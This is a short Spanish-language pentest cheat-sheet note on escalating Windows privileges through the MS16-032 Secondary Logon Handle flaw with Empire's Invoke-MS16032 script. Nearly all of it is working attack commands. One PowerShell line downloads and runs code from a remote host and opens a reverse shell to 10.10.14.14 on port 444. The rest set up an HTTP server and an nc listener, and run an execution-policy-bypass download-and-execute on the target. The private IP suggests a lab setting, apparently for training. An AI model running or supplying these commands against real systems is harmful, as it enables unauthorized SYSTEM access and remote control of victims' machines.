---
title: secondary logon handle
category: win privesc
order: 1
---


[WPE-11 - Secondary Logon Handle](https://pentestlab.blog/2017/04/07/secondary-logon-handle/)


usando el de empire [https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1]

## | modificamos invoke-ms160932.ps1 y le agregamos al final:
```
Invoke-MS16032 -Command "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.14/Invoke-PowerShellTcp.ps1');;Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.14 -Port 444"
```
## | levantamos un server http que tenga  Invoke-PowershellTcp.ps1 y invoke-ms16032.ps1
```
python -m SimpleHTTPServer 80
```
## | levantamos un listener  
```
nc -nlvp 444
```

## | en target:
```
C:> %SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -ep bypass -c  "iex(New-Object Net.Webclient).downloadString('http://10.10.14.14/invoke-ms16032.ps1')"
```
